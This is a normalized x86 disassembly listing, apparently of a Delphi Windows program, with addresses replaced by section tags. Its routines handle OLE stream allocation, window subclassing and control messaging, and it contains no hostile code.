lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
sub_47ab24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47abe6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47ae9c
push 0x0
push 0x2
call GlobalAlloc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push j_sub_4036cc#5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_4058a0
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CreateStreamOnHGlobal
call sub_4771f4
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_4771f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40bb00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47abed
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
sub_47abf4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_47a694
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_459300
mov edx esp
mov eax ebx
call sub_4553ec
push esp
mov eax ebx
call sub_45c17c
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
push 0x0
push 0xfffffffb
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
sub eax 0xfffffd9c
mov eax ebx
call sub_47b260
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_45c380
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax ebx
call sub_45c380
push eax
call ShowWindow
jmp r-xdata
sub_47ac98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edx edx
push ebp
push j_sub_4036cc#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_459ec0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ esi ]
cmp eax 0xbc00
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test [ ebx + 0x23e ] 0x1
jne r-xdata
cmp eax 0xc000
jae r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_45c380
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub [ esi ] 0x9c00
sub_47ad28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
pop esi
pop ebx
retn
sub_47ad50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4037f8#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_459688
mov eax [ ebp - 0x4 ]
push eax
push sub_47b670
mov eax [ ebp - 0x4 ]
push eax
push sub_47bffc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
setne cl
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47adbc
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4039e0
sub_47adf4
push ebx
mov ebx eax
lea ecx [ ebx + 0x238 ]
mov eax [ ebx + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x218 ]
call sub_4774ac
lea ecx [ ebx + 0x234 ]
mov edx r-xdata
mov eax [ ebx + 0x218 ]
call sub_4774ac
lea eax [ ebx + 0x228 ]
call sub_4058a0
lea eax [ ebx + 0x224 ]
call sub_4058a0
lea eax [ ebx + 0x220 ]
call sub_4058a0
pop ebx
retn
sub_47ae5c
push ebx
push esi
push edi
mov ebx [ eax + 0x208 ]
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x4c ]
call sub_4031ec
xor eax eax
mov [ ebx + 0x4c ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x4c ]
call sub_418dc4
call sub_4031ec
inc edi
dec esi
jne r-xdata
sub_47aebc
push ebx
mov ebx eax
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_45973c
pop ebx
retn
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
cmp [ ebx + 0x218 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x180 ] eax
pop ebx
retn
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_47af34
push ebx
push esi
push edi
push ecx
mov ebx eax
mov ecx [ ebx + 0x208 ]
mov edi [ ecx + 0x20 ]
mov esi [ ecx + 0x24 ]
xor eax eax
jmp r-xdata
cmp eax edi
jne r-xdata
cmp edx [ esi + eax * 4 ]
je r-xdata
xor eax eax
xor edx edx
jmp r-xdata
push eax
cmp [ ecx + 0x30 ] 0x191
jb r-xdata
inc eax
pop ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
call sub_403178
call sub_4031b4
add eax 0x7
and eax 0xfffffff8
mov eax [ ecx + 0x50 ]
test eax eax
jne r-xdata
add ebx eax
pop eax
mov edx [ ebx + eax * 8 + 0x4 ]
mov eax [ ebx + eax * 8 ]
sub_47afc8
push ebx
push esi
xor esi esi
call sub_46cc58
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov edx [ rw-data ]
mov esi [ eax + 0x248 ]
mov esi [ ebx + 0x248 ]
jmp r-xdata
sub_47b02c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_40f220
mov ecx esi
mov edx edi
mov eax ebx
call sub_47b11c
pop edi
pop esi
pop ebx
retn
sub_47b04c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_47b0fa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x244 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b101
lea eax [ ebp - 0x10 ]
call sub_4058a0
lea eax [ ebp - 0xc ]
call sub_4058a0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x244 ]
mov edx ebx
call sub_418dc4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ edi + 0x208 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_47af94
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_4058e4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4786fc
sub_47b11c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_4048e8
xor eax eax
push ebp
push sub_47b19e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47a694
mov [ esi ] 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push esi
push rw-data
push 0x2
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b1a5
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_4049b8
retn
lea edx [ ebp - 0x20 ]
call sub_477d40
sub_47b1c0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b20e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_47b21c
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_412538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b215
lea eax [ ebp - 0x10 ]
call sub_40f234
retn
sub_47b21c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_47b02c
pop edi
pop esi
pop ebx
retn
sub_47b234
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_40465c
mov ecx esp
mov edx edi
mov eax ebx
call sub_47b11c
mov eax [ esp + 0x8 ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_47b260
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
xor eax eax
mov [ esp ] eax
push esp
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
cmp [ esp ] 0x0
jne r-xdata
mov esi [ esp ]
mov [ ebx + 0x180 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov [ ebx + 0x174 ] eax
mov eax [ rw-data ]
mov [ eax ] ebx
push sub_4527ec
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SendMessageA
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_47b2f0
push ebx
push esi
push ebp
mov ebp esp
mov ebx eax
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
mov esp ebp
pop ebp
pop esi
pop ebx
retn
xor eax eax
lea esi [ ebx + 0x10 ]
push [ esi + 0x8 ]
je r-xdata
mov al [ esi ]
cmp al 0x1
ja r-xdata
push [ esi + 0x4 ]
test ah ah
jne r-xdata
mov ecx [ esi + 0x4 ]
mov ah 0x1
jmp r-xdata
add esi 0xc
dec edx
jne r-xdata
sub_47b330
push ebp
mov ebp esp
add esp 0xfffffd64
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x29c ]
mov eax [ ebp - 0x4 ]
call sub_47af34
cmp [ ebp - 0x29c ] 0x10000
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_47b497
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x294 ] eax
mov eax edx
mov [ ebp - 0x290 ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x29c ]
call sub_47b2f0
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
add eax eax
mov edx [ ebx ]
lea eax [ edx + eax * 8 ]
mov ebx eax
lea esi [ ebp - 0x28c ]
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x10c ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx eax
sub edx 0x4
je r-xdata
mov [ esi ] 0x0
mov edx [ ebp - 0xc ]
lea edi [ ebp + edx * 8 - 0x10c ]
xor edx edx
mov [ edi ] edx
test ah 0x40
je r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi ]
call sub_404d78
mov edx [ esi + 0x4 ]
mov [ edx ] eax
mov [ esi ] 0x1
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec edx
sub edx 0x3
jb r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_404d54
xor eax eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov edx edi
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_404d54
mov eax [ ebx + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ esi + 0x4 ] edi
jmp r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x10c ]
call sub_403f7c
test ebx ebx
jne r-xdata
add esi 0xc
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x290 ]
jne r-xdata
mov [ esi ] 0x2
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec edx
je r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
sub ebx 0x10
mov eax [ ebx ]
and eax 0xffff
mov edx eax
and edx 0xfff
cmp edx 0x8
jne r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] ebx
jmp r-xdata
jmp r-xdata
mov [ esi ] 0x0
test ah 0x20
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] ebx
jmp r-xdata
sub_47b4d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x30 ] 0x12c
jge r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_47af34
cmp [ ebp - 0x10 ] 0x10000
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_47b330
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push j_sub_4036cc#3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
push esi
mov esi [ ebp - 0x4 ]
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
pop esi
pop ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov esi [ esi ]
mov eax ebx
shl eax 0x4
xor edx edx
add esi eax
cmp ax 0x7
ja r-xdata
je r-xdata
test dl dl
jne r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
test eax 0x2000
je r-xdata
mov ecx esi
inc dl
test eax 0x2000
jne r-xdata
sub esi 0x10
mov eax [ esi ]
cmp ax 0x4
ja r-xdata
push esi
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
jmp r-xdata
sub_47b5b4
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
mov eax esi
call sub_45c684
and al [ esp ]
je r-xdata
test bl bl
jne r-xdata
push 0x0
push 0x0
push 0x30f
mov eax esi
call sub_45c380
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
test eax eax
setne bl
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov dl [ esp ]
mov eax esi
call sub_45b610
mov ebx eax
sub_47b604
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov ebx [ esi + 0x244 ]
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov ebx eax
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax ebp
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0x244 ]
call sub_418dc4
cmp ebp eax
jne r-xdata
mov edx [ esi + 0x208 ]
mov edx [ edx + 0x40 ]
mov edx [ edx + edi * 4 ]
mov ecx eax
mov eax esi
call sub_47ba04
jmp r-xdata
sub_47b670
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47ae9c
xor eax eax
push ebp
push sub_47b712
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
push 0x2
call GlobalAlloc
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] esi
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_47b701
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b708
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
call sub_40bb00
sub_47b72c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebx + 0x48 ]
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
test eax eax
jg r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45bd34
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test edx edx
jle r-xdata
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov esi [ ebx + 0x48 ]
mov eax [ ebx + 0x4c ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
mov eax [ ebp + 0x8 ]
push eax
call MulDiv
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
push esi
call MulDiv
lea ecx [ ebp - 0x10 ]
pop edx
call sub_417744
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
test eax eax
je r-xdata
sub_47b7e4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x10 ] 0x5
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x10 ]
call sub_47baf4
mov esp ebp
pop ebp
retn 0x8
sub_47b83c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b8e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_404014
mov edx esi
mov eax ebx
call sub_455834
cmp [ ebx + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b8e9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
push 0xfffffd42
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x2c ]
test al 0x30
je r-xdata
test al 0x10
je r-xdata
mov edi 0xfffffdfb
mov edi 0xfffffdfa
jmp r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_47bbc8
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_47b1c0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404388
jne r-xdata
sub_47b924
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b9f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455920
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b9fb
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
xor eax eax
push ebp
push j_sub_4036cc#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_4058a0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4771f4
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_47b98e
or ebx 0xffffffff
call sub_403a34
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4771f4
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b9fb
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_47ba04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47bae6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47baed
lea eax [ ebp - 0x10 ]
call sub_4058a0
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x1
xor eax eax
push ebp
push sub_47bac9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov edx ebx
call sub_418dc4
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_4786ac
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47b80c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_47baf4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_4048e8
xor eax eax
push ebp
push sub_47bb9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47a694
mov [ ebp - 0x10 ] esi
mov eax rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ esi ] 0x9
je r-xdata
mov eax 0x8
mov eax 0x4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bba2
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_4049b8
retn
lea edx [ ebp - 0x30 ]
call sub_477d40
push 0x0
lea edx [ ebp - 0x30 ]
push edx
push 0x0
lea edx [ ebp - 0x10 ]
push edx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
sub_47bbc8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] 0x8
mov eax edi
call sub_404d78
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47bc18
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_47baf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bc1f
mov eax [ ebp - 0x8 ]
push eax
call SysFreeString
retn
sub_47bc28
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax esi
call sub_46cc58
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
cmp esi [ edi + 0x27c ]
jne r-xdata
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
xor eax eax
mov [ edi + 0x27c ] eax
mov [ edi + 0x27c ] esi
jmp r-xdata
cmp esi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_456c00
sub_47bc78
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403980#9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_41375c
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_47b91c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bccd
lea eax [ ebp - 0x10 ]
call sub_40f234
retn
sub_47bcd4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov edi edx
mov ebx eax
mov [ esp ] 0x8
mov eax esi
xor edx edx
call sub_4047d4
je r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_4047b8
mov [ esp + 0x8 ] eax
jmp r-xdata
mov ecx esp
mov edx edi
mov eax ebx
call sub_47baf4
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_47bd18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ecx ]
xor eax eax
push ebp
push j_sub_4036cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
add eax 0x25f
cmp eax 0x7
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_47bd4d ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffeb
